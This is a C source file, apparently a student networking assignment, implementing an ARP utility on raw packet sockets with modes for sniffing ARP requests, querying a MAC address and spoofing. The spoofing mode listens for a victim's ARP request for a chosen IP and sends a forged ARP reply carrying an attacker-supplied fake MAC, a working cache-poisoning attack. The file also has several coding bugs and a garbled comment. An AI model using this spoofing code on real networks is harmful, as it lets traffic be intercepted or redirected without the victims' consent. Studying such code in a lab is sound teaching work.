#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/in.h>
#include "arp.h"
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>

#define Ether_Hdr_Len 14
#define Ether_Arp_Len 28
#define Packet_Len Ether_Hdr_Len + Ether_Arp_Len
#define IP_ADDR_LEN 4
/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "enp0s3"

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */
int main(int argc, char* argv[])
{
	int sockfd_recv = 0, sockfd_send = 0;
	int op = 0,motion=0;
	char *query_target;
	uint8_t *filter_ip_addr;
	char *fake_mac_addr = NULL;
	char *target_ip_addr = NULL;
	char *src_ip = malloc(sizeof(IP_ADDR_LEN));
	unsigned char src_mac[ETH_ALEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char broadcast_mac[ETH_ALEN]={0xff,0xff,0xff,0xff,0xff,0xff};
	struct sockaddr_ll sa;
	struct ifreq req;
	struct in_addr myip,dst_ip;
	while(1)
	{
		op = getopt(argc,argv,"q:l:h::");
		if(op == -1)break;
		switch(op){
			case 'q': //send arp request
				query_target = optarg;
				motion = 3;
				/*printf("opening a send socket query_target:");
				printf("%s",query_target);
				printf("\n");*/
				break;
			case 'l': //listen packets
				//printf("opening a recv socket optarg =%s\n",optarg);
				if(strcmp(optarg,"-a")==0){
					//printf("listen all");
					motion = 1;
				}else{ 
					//printf("filter_ip_addr :");
					filter_ip_addr = convert(optarg);
					/*print_ip_addr(filter_ip_addr);
					printf("\n");*/
					motion = 2;
					//strcpy(filter_ip_addr,optarg);
				}
				break;
			case 'h':
				if(strcmp("elp" , optarg)==0){
					print_usage();
				}
				break;
			default: //arp spoofing
				printf("wrong argument! please type ./arp -help to see usage \n");
				motion = 4;			
				break;
		}
	}
	

	if(motion == 1||motion ==2){
		char buffer[Packet_Len];
		struct sockaddr from;
		struct ether_header *header;
		struct ether_arp *arp_p;
		// Open a recv socket in data-link layer.
		if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
		{
			perror("open recv socket error");
			exit(1);
		}
		/*
		 * Use recvfrom function to get packet.
		 * recvfrom( ... )
		 */
		while(1){
			memset(buffer,'\0',Packet_Len);
			recvfrom(sockfd_recv,buffer,Packet_Len,0,&from,sizeof(from)); //get packet and store in buffer
			header = buffer; //point to ethernet header
			arp_p = buffer + Ether_Hdr_Len; //point to arp
			//printf("Ethernet type : 0x%x  a = %d\n",ntohs(header->ether_type),all);
			if(ntohs(header->ether_type)==0x806 && ntohs(arp_p->arp_op)==ARPOP_REQUEST){// 0806 is represent ARP 
				if(motion == 1){ // capture all arp packet
					printf("Get ARP packet - who has ");
					print_ip_addr(arp_p->arp_tpa);
					printf("          Tell ");
					print_ip_addr(arp_p->arp_spa);
					printf("\n");
				}else{ // capture specific IP arp packet
					int src_hit = 1,dst_hit = 1;
					for(int j=0;j<IP_ADDR_LEN;j++){
						if(filter_ip_addr[j]!=arp_p->arp_spa[j]){
							src_hit = 0;
						}
						if(filter_ip_addr[j]!=arp_p->arp_tpa[j]){
							dst_hit = 0;
						}
					}
					if(src_hit==1||dst_hit==1)
					{
						printf("Get ARP packet - who has ");
						print_ip_addr(arp_p->arp_tpa);
						printf("          Tell ");
						print_ip_addr(arp_p->arp_spa);
						printf("\n");
					}
				}
			}
		}
		close(sockfd_recv);
	}
		
	if(motion == 3){ //send arp packet and wait the reply
		struct ether_header *header;
		struct ether_arp *arp_p;
		char packet[Packet_Len];//packet len 42
		// Open a send socket in data-link layer.
		if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
		{
			perror("open send socket error\n");
			exit(sockfd_send);
		}
		if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) //open receive socket
		{
			perror("open recv socket error");
			exit(1);
		}
		/*
		* Use ioctl function binds the send socket and the Network Interface Card.
	`	 * ioctl( ... )
		*/
		memset(&req,'\0',sizeof(req));
		strncpy(req.ifr_name, DEVICE_NAME,IF_NAMESIZE-1);
		if(ioctl(sockfd_send,SIOGIFINDEX,&req) < 0){//get interface index and store in req
			perror("get ifindex failed\n");
		}
		if(ioctl(sockfd_send,SIOCGIFADDR,&req) < 0){//get interface ip and store in req
			perror("get ip failed\n");
		}
		if(ioctl(sockfd_send,SIOCGIFHWADDR,&req) < 0){//get interface MAC and store in req
			perror("get MAC failed\n");
		}
		// Fill the parameters of the sa.
		memset(&sa,'\0',sizeof(struct sockaddr_ll));
		memset(&packet,'\0',Packet_Len);
		sa.sll_family = AF_PACKET;
		sa.sll_ifindex = if_nametoindex(req.ifr_name);
		sa.sll_protocol = ETH_P_IP;
		myip = ((struct sockaddr_in *)&(req.ifr_addr))->sin_addr;
		src_ip = inet_ntoa(myip);
		memcpy(src_mac,req.ifr_hwaddr.sa_data,ETH_ALEN);
		header = (struct  ether_header *)packet; //fill header
		memcpy(header->ether_shost,&src_mac,ETH_ALEN);
		memcpy(header->ether_dhost,&broadcast_mac,ETH_ALEN);
		header->ether_type = htons(ETHERTYPE_ARP);
		arp_p = (struct ether_arp *)(packet + Ether_Hdr_Len);
		set_hard_type(arp_p,ARPHRD_ETHER);//fill arp
		set_prot_type(arp_p,ETHERTYPE_IP);
		set_hard_size(arp_p,ETH_ALEN);
		set_prot_size(arp_p,IP_ADDR_LEN);
		set_op_code(arp_p,ARPOP_REQUEST);
		set_sender_hardware_addr(arp_p,&src_mac);
		set_target_hardware_addr(arp_p,&broadcast_mac);
		set_sender_protocol_addr(arp_p,src_ip);
		set_target_protocol_addr(arp_p,query_target);
		/*
		* use sendto function with sa variable to send your packetunsigned char src_mac[ETH_ALEN];ut
		* sendto( ... )
		*/
		printf("------------------------waiting arp reply ------------------------\n");
		int result = sendto(sockfd_send,packet,Packet_Len,0,(struct sockaddr *)&sa,sizeof(struct sockaddr_ll));
		if(result < 0){
			perror("send ARP failed\n");
		}
		close(sockfd_send);

		char buffer[Packet_Len];
		char *tmp;
		struct sockaddr from;
		while(1){
			memset(buffer,'\0',Packet_Len);
			recvfrom(sockfd_recv,buffer,Packet_Len,0,&from,sizeof(from)); //get packet and store in buffer
			header = buffer; // header point to packet start
			arp_p = buffer + Ether_Hdr_Len; // arp point to arp start
			if(ntohs(header->ether_type)==0x806 && ntohs(arp_p->arp_op)==ARPOP_REPLY){// capture arp packet
				//printf("get reply \n");
				tmp = get_sender_protocol_addr(arp_p);
				if(strcmp(tmp,query_target)==0){//sender ip same with query target
					printf("MAC ADDRESS of %s is at %02x:%02x:%02x:%02x:%02x:%02x\n",query_target,
					arp_p->arp_sha[0],arp_p->arp_sha[1],arp_p->arp_sha[2],
					arp_p->arp_sha[3],arp_p->arp_sha[4],arp_p->arp_sha[5]);
					break;
				}
			}
		}
		close(sockfd_recv);
	}
	
	if(motion == 0){//arp spoof
		if(strlen(argv[1])>18 || strlen(argv[2])>INET_ADDRSTRLEN){
			printf("fake mac address or target ip address format wrong!!\n");
			return 0;
		}
		fake_mac_addr = malloc(18);
		strcpy(fake_mac_addr,argv[1]);
		target_ip_addr = malloc(INET_ADDRSTRLEN);
		strcpy(target_ip_addr,argv[2]);
		printf("fake mac : %s & target ip : %s\n",fake_mac_addr,target_ip_addr);
		char buffer[Packet_Len];
		struct sockaddr from;
		struct ether_header *header_recv,*header_send;
		struct ether_arp *arp_p_recv,*arp_p_send;
		char packet[Packet_Len];
		char *victim_ip,*victim_mac;
		char *tmp;
		if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) //open receive socket
		{
			perror("open recv socket error");
			exit(1);
		}
		if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) //open send socket
		{
			perror("open send socket error\n");
			exit(sockfd_send);
		}
		while(1){
			memset(buffer,'\0',Packet_Len);
			recvfrom(sockfd_recv,buffer,Packet_Len,0,&from,sizeof(from)); //get packet and store in buffer
			header_recv = buffer; // header point to packet start
			arp_p_recv = buffer + Ether_Hdr_Len; // arp point to arp start
			if(ntohs(header_recv->ether_type)==0x806 && ntohs(arp_p_recv->arp_op)==ARPOP_REQUEST){// capture arp packet
				tmp = get_target_protocol_addr(arp_p_recv);
				if(strcmp(tmp,target_ip_addr)==0){//victim request query ip same with target ip
					victim_ip = get_sender_protocol_addr(arp_p_recv);
					victim_mac = get_sender_hardware_addr(arp_p_recv);
					memset(&req,'\0',sizeof(req));
					strncpy(req.ifr_name, DEVICE_NAME,IF_NAMESIZE-1);
					// Fill the parameters of the sa.
					memset(&sa,'\0',sizeof(struct sockaddr_ll));
					memset(&packet,'\0',Packet_Len);
					sa.sll_family = AF_PACKET;
					sa.sll_ifindex = if_nametoindex(req.ifr_name);
					sa.sll_protocol = ETH_P_IP;
					header_send = (struct  ether_header *)packet;
					arp_p_send = (struct ether_arp *)(packet + Ether_Hdr_Len);
					sscanf(fake_mac_addr,"%02x:%02x:%02x:%02x:%02x:%02x",&src_mac[0],&src_mac[1],
					&src_mac[2],&src_mac[3],&src_mac[4],&src_mac[5]);
					sscanf(victim_mac,"%02x:%02x:%02x:%02x:%02x:%02x",&dst_mac[0],&dst_mac[1],
					&dst_mac[2],&dst_mac[3],&dst_mac[4],&dst_mac[5]);
					/*printf("%x:%x:%x:%x:%x:%x\n",src_mac[0],src_mac[1],
					src_mac[2],src_mac[3],src_mac[4],src_mac[5]);
					printf("%s\n",victim_mac);
					printf("%02x:%02x:%02x:%02x:%02x:%02x\n",dst_mac[0],dst_mac[1],
					dst_mac[2],dst_mac[3],dst_mac[4],dst_mac[5]);*/
					memcpy(header_send->ether_shost,&src_mac,ETH_ALEN);
					memcpy(header_send->ether_dhost,&dst_mac,ETH_ALEN);
					header_send->ether_type = htons(ETHERTYPE_ARP);
					set_hard_type(arp_p_send,ARPHRD_ETHER);//fill arp
					set_prot_type(arp_p_send,ETHERTYPE_IP);
					set_hard_size(arp_p_send,ETH_ALEN);
					set_prot_size(arp_p_send,IP_ADDR_LEN);
					set_op_code(arp_p_send,ARPOP_REPLY);
					set_sender_hardware_addr(arp_p_send,&src_mac);
					set_sender_protocol_addr(arp_p_send,target_ip_addr);
					set_target_hardware_addr(arp_p_send,&dst_mac);
					set_target_protocol_addr(arp_p_send,victim_ip);
					/*for(int i=0;i<Packet_Len;i++){
						printf("%02x ",packet[i]);
					}*/
					int result = sendto(sockfd_send,packet,Packet_Len,0,(struct sockaddr *)&sa,sizeof(struct sockaddr_ll));
					if(result < 0){
						perror("send ARP failed\n");
					}
					close(sockfd_send);
					free(victim_ip);
					free(victim_mac);
					break;
				}
			}
		}
	}
	return 0;
}

